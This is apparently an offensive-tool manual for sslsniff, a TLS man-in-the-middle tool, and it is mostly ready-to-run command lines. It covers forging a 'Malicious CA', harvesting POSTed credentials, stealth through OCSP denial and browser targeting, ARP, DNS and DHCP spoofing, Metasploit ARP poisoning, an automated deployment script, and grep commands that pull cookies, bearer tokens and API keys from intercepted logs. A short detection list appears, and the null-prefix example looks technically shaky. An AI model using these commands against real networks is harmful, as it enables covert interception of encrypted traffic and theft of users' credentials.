---
mitre_tactic: collection
mitre_tactic_id: TA0009
tool_name: sslsniff
tool_category: SSL/TLS MITM Attack
github: https://github.com/moxie0/sslsniff
version: 0.8
license: GPL-2.0
language: C++
---

# sslsniff - SSL/TLS Man-in-the-Middle Attack Tool

## Chapter 1: Overview

sslsniff is designed to create man-in-the-middle attacks for SSL/TLS connections, dynamically generating certificates for accessed domains. It supports certificate chain signing with any provided CA certificate and includes attacks like null-prefix and OCSP for silent interception.

**Core Function:** Perform SSL/TLS man-in-the-middle attacks with dynamic certificate generation

**Primary Use Cases:**
- SSL/TLS interception for security testing
- Certificate validation vulnerability testing
- Null-prefix certificate attacks
- OCSP-based silent interception
- Browser fingerprinting and targeted attacks
- Capturing encrypted web traffic

**Key Capabilities:**
- Dynamic certificate generation on-the-fly
- Certificate chain signing with custom CA
- Null-prefix certificate attacks
- OCSP request denial
- Browser-specific targeting (Firefox, IE, Safari, Opera, iOS)
- HTTP and HTTPS interception
- Mozilla Addon update interception

**Attack Modes:**
- **Authority Mode:** Use a CA certificate to sign all generated certs
- **Targeted Mode:** Use a directory of certificates to target specific domains

---

## Chapter 2: Installation

### Kali Linux (Default)

```bash
sudo apt install sslsniff
```

### From Source

```bash
git clone https://github.com/moxie0/sslsniff.git
cd sslsniff
./configure
make
sudo make install
```

### Dependencies

- OpenSSL (SSL/TLS operations)
- Boost (filesystem, threading)
- log4cpp (logging)

### Verify Installation

```bash
sslsniff -h
```

### Generate CA Certificate

```bash
# Generate CA key
openssl genrsa -out ca.key 2048

# Generate CA certificate
openssl req -new -x509 -key ca.key -out ca.crt -days 365 -subj "/CN=Fake CA"
```

---

## Chapter 3: Architecture and Operation

### Attack Flow

```
1. Client → sslsniff: HTTPS connection (ClientHello)
2. sslsniff → Server: Forward ClientHello
3. Server → sslsniff: ServerHello + Certificate
4. sslsniff: Generate forged certificate using CA
5. sslsniff → Client: Forged certificate (signed by attacker CA)
6. Client → sslsniff: Encrypted request (using forged cert)
7. sslsniff: Decrypt, log, re-encrypt
8. sslsniff → Server: Forward request
```

### MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Man-in-the-Middle | T1557 | Intercept communications |
| Forge Web Certificates | T1553.004 | Forge SSL certificates |
| Network Sniffing | T1040 | Capture network traffic |

### Certificate Generation

```
┌─────────────────────────────────────────────────────────────────┐
│                sslsniff Certificate Process                      │
├─────────────────────────────────────────────────────────────────┤
│  1. Receive ClientHello with target domain                      │
│  2. Connect to real server, get original certificate            │
│  3. Generate new certificate matching original properties       │
│  4. Sign with attacker CA certificate                           │
│  5. Return forged certificate to client                         │
│  6. Client trusts forged cert (if CA is trusted)                │
└─────────────────────────────────────────────────────────────────┘
```

---

## Chapter 4: Command Reference

### Basic Authority Mode

```bash
sslsniff -a -c ca.crt -s 443 -w output.log
```

**Explanation:** Start sslsniff in authority mode, using ca.crt as CA, listening on port 443, logging to output.log.

### With Certificate Chain

```bash
sslsniff -a -c ca.crt -m intermediate.crt -s 443 -w output.log
```

**Explanation:** Include intermediate certificate in the chain.

### Targeted Mode

```bash
sslsniff -t /path/to/certs/ -s 443 -w output.log
```

**Explanation:** Use directory of pre-generated certificates for targeted domains.

### HTTP Interception

```bash
sslsniff -a -c ca.crt -s 443 -h 8080 -w output.log
```

**Explanation:** Also intercept HTTP traffic on port 8080 for fingerprinting.

### Browser Filtering

```bash
# Firefox only
sslsniff -a -c ca.crt -s 443 -f ff -w output.log

# Multiple browsers
sslsniff -a -c ca.crt -s 443 -f ff,ie,safari -w output.log

# All browsers
sslsniff -a -c ca.crt -s 443 -f ff,ie,safari,opera -w output.log
```

**Explanation:** Only intercept requests from specified browsers.

### Deny OCSP Requests

```bash
sslsniff -a -c ca.crt -s 443 -d -w output.log
```

**Explanation:** Deny OCSP requests for forged certificates to prevent revocation checking.

### Log POST Requests Only

```bash
sslsniff -a -c ca.crt -s 443 -p -w output.log
```

**Explanation:** Only log HTTP POST requests (useful for credential capture).

### Mozilla Addon Interception

```bash
sslsniff -a -c ca.crt -s 443 -e https://addons.mozilla.org -j sha256_hash -w output.log
```

**Explanation:** Intercept Mozilla addon update requests and inject custom addon.

### Firefox Update Location

```bash
sslsniff -a -c ca.crt -s 443 -u /path/to/firefox_update.xml -w output.log
```

**Explanation:** Specify Firefox XML update file location for interception.

---

## Chapter 5: Advanced Attack Scenarios

### Scenario 1: Credential Harvesting

**Setup:**

```bash
# Generate CA
openssl genrsa -out ca.key 2048
openssl req -new -x509 -key ca.key -out ca.crt -days 365 -subj "/CN=Malicious CA"

# Start sslsniff
sslsniff -a -c ca.crt -s 443 -p -w credentials.log

# Redirect traffic to sslsniff (requires network positioning)
```

**Explanation:** Capture HTTP POST credentials from encrypted connections.

### Scenario 2: OCSP Attack

**Setup:**

```bash
# Start sslsniff with OCSP denial
sslsniff -a -c ca.crt -s 443 -d -w ocsp_attack.log

# The -d flag denies OCSP requests, preventing certificate revocation checking
```

**Explanation:** Deny OCSP requests to prevent detection of forged certificates.

### Scenario 3: Null-Prefix Certificate Attack

**Setup:**

```bash
# Generate certificate with null prefix in CN
# (Requires specialized CA with null-prefix support)
sslsniff -a -c null_prefix_ca.crt -s 443 -w null_prefix.log

# Exploit vulnerability in certificate validation
```

**Explanation:** Exploit null-prefix vulnerabilities in certificate validation.

### Scenario 4: Targeted Domain Attack

**Setup:**

```bash
# Prepare certificate directory
mkdir certs/
cp target.com.crt certs/
cp target.com.key certs/

# Start targeted mode
sslsniff -t certs/ -s 443 -w targeted.log
```

**Explanation:** Use pre-generated certificates for specific target domains.

---

## Chapter 6: Detection and Evasion

### Detection Methods

- **Certificate Transparency:** Monitor for unexpected certificate issuances
- **OCSP Stapling:** Check for OCSP responses
- **Certificate Pinning:** Verify against pinned certificates
- **Network Analysis:** Detect proxy connections

### Evasion Techniques

1. **OCSP Denial:** Use `-d` flag to prevent revocation checking
2. **Browser Targeting:** Use `-f` to target specific browsers
3. **Certificate Chain:** Use `-m` for intermediate certificates
4. **Custom CA:** Use well-known CA names for trust

### Stealth Configuration

```bash
# Deny OCSP and target specific browser
sslsniff -a -c ca.crt -s 443 -d -f ff -w stealth.log

# Minimal logging
sslsniff -a -c ca.crt -s 443 -p -w minimal.log
```

---

## Chapter 7: Integration with Other Tools

### Network Positioning

```bash
# Requires network positioning (ARP spoofing, DNS spoofing, etc.)
# Example with arpspoof
arpspoof -i eth0 -t target.local gateway_ip

# Example with dnschef
dnschef --fakeip attacker_ip --fake domains=facebook.com
```

### SSLStrip Integration

```bash
# Combine with sslstrip for HTTP downgrade
sslstrip -l 10000 &
sslsniff -a -c ca.crt -s 443 -w combined.log
```

### Metasploit Integration

```bash
# Use sslsniff during exploitation
# Requires network positioning via Metasploit
```

### Wireshark Analysis

```bash
# Capture traffic for analysis
tcpdump -i eth0 -w sslsniff_traffic.pcap port 443
```

---

## Chapter 8: Troubleshooting

### Common Issues

**Issue:** Certificate not accepted by client

```bash
# Ensure CA is trusted by client
# Install ca.crt in browser/system trust store

# For Firefox
# Settings > Privacy & Security > Certificates > View Certificates
# Import ca.crt
```

**Issue:** Connection fails after interception

```bash
# Check certificate generation
sslsniff -a -c ca.crt -s 443 -w debug.log 2>&1 | tee sslsniff_debug.log

# Verify CA certificate
openssl x509 -in ca.crt -text -noout
```

**Issue:** OCSP requests leaking

```bash
# Deny OCSP requests
sslsniff -a -c ca.crt -s 443 -d -w ocsp_denied.log
```

**Issue:** Browser not being intercepted

```bash
# Check browser fingerprinting
sslsniff -a -c ca.crt -s 443 -h 8080 -w fingerprint.log

# Verify browser user-agent
grep "User-Agent" fingerprint.log
```

### Debug Mode

```bash
sslsniff -a -c ca.crt -s 443 -w debug.log 2>&1 | tee sslsniff_full.log
```

### Verify CA Certificate

```bash
# Check CA certificate details
openssl x509 -in ca.crt -text -noout

# Verify certificate chain
openssl verify -CAfile ca.crt generated.crt
```

---

## Chapter 9: Network Positioning Techniques

### ARP Spoofing

```bash
# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Spoof ARP replies to redirect traffic
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 &

# Verify ARP cache poisoning
arp -n | grep 192.168.1.100
```

### DNS Spoofing

```bash
# Using dnschef for DNS redirection
sudo python3 dnschef.py --fakeip 10.0.0.5 --fake domains=facebook.com,twitter.com

# Using dnsmasq for DNS spoofing
echo "address=/#/10.0.0.5" > /tmp/dnsmasq_spoof.conf
sudo dnsmasq -C /tmp/dnsmasq_spoof.conf --no-daemon

# Combined with sslsniff
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &
sslsniff -a -c ca.crt -s 443 -w intercepted.log
```

### DHCP Spoofing

```bash
# Using Yersinia for DHCP attacks
sudo yersinia dhcp -attack 1 -interface eth0

# Rogue DHCP assigning attacker as gateway
# Traffic flows through attacker for interception
```

### iptables Traffic Redirection

```bash
# Redirect HTTPS traffic to sslsniff
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 \
  -j REDIRECT --to-port 8443

# Redirect all outbound HTTPS (requires routing control)
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 \
  -j REDIRECT --to-ports 8443

# Redirect specific subnet
sudo iptables -t nat -A PREROUTING -s 192.168.1.0/24 -p tcp \
  --dport 443 -j REDIRECT --to-ports 8443

# Clean up rules
sudo iptables -t nat -D PREROUTING -i eth0 -p tcp --dport 443 \
  -j REDIRECT --to-port 8443
```

### nftables Rules

```bash
# Modern nftables equivalent
sudo nft add table nat
sudo nft add chain nat prerouting { type nat hook prerouting priority 0 \; }
sudo nft add rule nat prerouting iif eth0 tcp dport 443 redirect to :8443

# With IP address filtering
sudo nft add rule nat prerouting iif eth0 ip saddr 192.168.1.0/24 \
  tcp dport 443 redirect to :8443
```

---

## Chapter 10: Certificate Attack Deep Dive

### Null-Prefix Certificate Attack

The null-prefix attack exploits a vulnerability where a null byte (\x00) in the Common Name (CN) field of a certificate causes some parsers to truncate the name at that point:

```
CN=www.good.com\x00www.evil.com
```

Certain older browsers or certificate validators might parse this as `www.good.com` while the actual certificate was issued for `www.evil.com`.

```bash
# Generate a certificate with null prefix (requires vulnerable CA)
# This attack is largely mitigated in modern systems

# Test if a system is vulnerable
# Create a certificate with embedded null bytes
openssl req -new -x509 -key attacker.key -out null_prefix.crt \
  -subj "/CN=www.good.com\x00www.evil.com" -days 365

# Install in sslsniff targeted mode
mkdir -p /tmp/targeted_certs/
cp null_prefix.crt /tmp/targeted_certs/
cp attacker.key /tmp/targeted_certs/
sslsniff -t /tmp/targeted_certs/ -s 443 -w null_prefix.log
```

### OCSP Attack Mechanics

The OCSP denial attack works by intercepting and blocking Online Certificate Status Protocol requests, preventing browsers from checking whether a certificate has been revoked:

```bash
# sslsniff with OCSP denial
sslsniff -a -c ca.crt -s 443 -d -w ocsp_attack.log

# Monitor OCSP requests being blocked
sudo tcpdump -i eth0 port 80 -w ocsp_requests.pcap

# Analyze blocked OCSP requests
tcpdump -r ocsp_requests.pcap -A | grep "OCSP"
```

**How OCSP denial works:**
1. Browser connects to sslsniff
2. sslsniff presents forged certificate
3. Browser tries to check OCSP revocation status
4. sslsniff blocks the OCSP request (returns connection refused or timeout)
5. Browser falls back to "OCSP unknown" status
6. Some browsers accept certificates when OCSP is unavailable

### Certificate Chain Attacks

```bash
# Generate a full certificate chain
# Root CA
openssl genrsa -out rootCA.key 4096
openssl req -new -x509 -key rootCA.key -out rootCA.crt -days 3650 \
  -subj "/CN=Attacker Root CA"

# Intermediate CA (signed by root)
openssl genrsa -out intermediateCA.key 2048
openssl req -new -key intermediateCA.key -out intermediateCA.csr \
  -subj "/CN=Attacker Intermediate CA"
openssl x509 -req -in intermediateCA.csr -CA rootCA.crt -CAkey rootCA.key \
  -CAcreateserial -out intermediateCA.crt -days 1825

# Use chain with sslsniff
sslsniff -a -c intermediateCA.crt -m rootCA.crt -s 443 -w chain_attack.log
```

### Browser-Specific Targeting Details

```bash
# Target Firefox specifically
# Firefox uses its own certificate store, not the system store
sslsniff -a -c ca.crt -s 443 -f ff -w firefox_only.log

# Target Internet Explorer / Edge
sslsniff -a -c ca.crt -s 443 -f ie -w ie_only.log

# Target Safari (macOS)
sslsniff -a -c ca.crt -s 443 -f safari -w safari_only.log

# Target Opera
sslsniff -a -c ca.crt -s 443 -f opera -w opera_only.log

# Target iOS devices
sslsniff -a -c ca.crt -s 443 -f ios -w ios_only.log

# Combine browser filtering with HTTP fingerprinting
sslsniff -a -c ca.crt -s 443 -h 8080 -f ff,ie -w multi_browser.log
```

**Browser detection mechanism:** sslsniff uses HTTP on a secondary port to fingerprint browsers via their User-Agent strings, then selectively intercepts connections from targeted browsers.

---

## Chapter 11: Scripting and Automation

### Automated Certificate Deployment

```bash
#!/bin/bash
# auto_sslsniff.sh - Automated sslsniff deployment

CA_KEY="/tmp/ca.key"
CA_CERT="/tmp/ca.crt"
LOG_DIR="/var/log/sslsniff"
INTERFACE="eth0"
LISTEN_PORT="443"

# Generate CA if not exists
if [ ! -f "$CA_KEY" ]; then
    echo "[*] Generating CA certificate..."
    openssl genrsa -out "$CA_KEY" 2048
    openssl req -new -x509 -key "$CA_KEY" -out "$CA_CERT" -days 365 \
        -subj "/CN=Security Assessment CA"
fi

# Create log directory
mkdir -p "$LOG_DIR"

# Start sslsniff
echo "[*] Starting sslsniff on port $LISTEN_PORT..."
sslsniff -a -c "$CA_CERT" -s "$LISTEN_PORT" \
    -d \
    -w "$LOG_DIR/intercept_$(date +%Y%m%d_%H%M%S).log" \
    -p \
    2>&1 | tee "$LOG_DIR/sslsplit_console.log"
```

### Output Parsing

```bash
# Extract POST requests from sslsniff output
grep -B2 "POST" intercepted.log | grep -E "Host:|POST|Cookie"

# Extract all visited URLs
grep "Host:" intercepted.log | sort -u

# Count connections per domain
grep "Host:" intercepted.log | awk '{print $2}' | sort | uniq -c | sort -rn

# Extract authentication headers
grep -i "authorization\|x-api-key\|bearer" intercepted.log
```

### Integration with Metasploit

```bash
# Use sslsniff alongside Metasploit exploitation
# 1. Set up network positioning
msfconsole -q -x "use auxiliary/spoof/arp/arp_cache_poison; set HOSTS 192.168.1.0/24; run"

# 2. Start sslsniff for credential capture
sslsniff -a -c ca.crt -s 443 -p -w msf_creds.log &

# 3. Exploit captured credentials
```

---

## Chapter 12: SSL/TLS Protocol Analysis

### Supported TLS Versions

| Version | Status | sslsniff Support |
|---------|--------|-----------------|
| SSL 2.0 | Deprecated | Limited |
| SSL 3.0 | Deprecated | Yes |
| TLS 1.0 | Deprecated | Yes |
| TLS 1.1 | Deprecated | Yes |
| TLS 1.2 | Current | Yes |
| TLS 1.3 | Current | Partial |

### TLS 1.3 Considerations

TLS 1.3 encrypts more of the handshake process, which limits some sslsniff attack vectors:

```bash
# Detect TLS 1.3 connections
sslsniff -a -c ca.crt -s 443 -v -w tls13_debug.log 2>&1 | grep "TLS 1.3"

# TLS 1.3 hides the Server Name in encrypted SNI (ESNI/eSNI)
# sslsniff may not be able to determine the target domain
```

### Cipher Suite Negotiation Analysis

```bash
# Monitor cipher suite negotiation
sslsniff -a -c ca.crt -s 443 -v -w cipher_analysis.log 2>&1 | grep -i "cipher"

# Look for weak cipher suites
sslsniff -a -c ca.crt -s 443 -v -w weak_cipher.log 2>&1 | \
  grep -i "RC4\|DES\|NULL\|EXPORT\|anon\|MD5"
```

---

## Resources

- **GitHub:** https://github.com/moxie0/sslsniff
- **Kali Documentation:** https://www.kali.org/tools/sslsniff/
- **Moxie Marlinspike Presentations:** https://www.blackhat.com/presentations.html
- **SSL/TLS Security:** https://www.howsmyssl.com/
- **Certificate Tools:** https://www.ssllabs.com/
- **RFC 5246 (TLS 1.2):** https://tools.ietf.org/html/rfc5246
- **RFC 8446 (TLS 1.3):** https://tools.ietf.org/html/rfc8446
- **RFC 6960 (OCSP):** https://tools.ietf.org/html/rfc6960
- **OWASP TLS Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/TLS_Cheat_Sheet.html
